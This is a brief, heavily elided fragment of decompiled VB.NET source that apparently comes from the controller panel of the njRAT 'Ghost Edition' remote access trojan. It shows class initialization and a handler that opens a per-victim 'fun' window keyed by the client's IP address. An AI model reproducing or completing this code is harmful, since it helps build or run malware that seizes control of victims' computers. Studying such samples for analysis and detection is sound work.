...
Friend NotInheritable Class Class7
    ...
    Shared Sub New()
        ...
        Class7.string_0 = "NjRat Ghost Edition"
        Class7.long_0 = 0L
        Class7.long_1 = 0L
        Class7.string_1 = "|Ghost|"
        Class7.int_0 = 1
        Class7.int_1 = 2
        Class7.int_2 = 3
        Class7.int_3 = 4
...
label_106:
            ...
            ElseIf Operators.CompareString(Left1, "fun", False) = 0 Then
                If Class7.form1_0.InvokeRequired Then
                    ' ISSUE: method pointer
                    Class7.form1_0.Invoke(New Delegate0(AddressOf Class7.smethod_5), New Object() {RuntimeHelpers.GetObjectValue(object_0)})
                Else
                    If Class7.smethod_3("fun" & client_0.ip()) Is Nothing Then
                        Dim fun As New Fun()
                        fun.c = client_0
                        Fun.Name = "fun" & client_0.ip()
                        Fun.Text = Conversions.ToString(Class7.smethod_1(client_0.L))
                        DirectCast(Fun, Control).Show()
                    End If
                End If
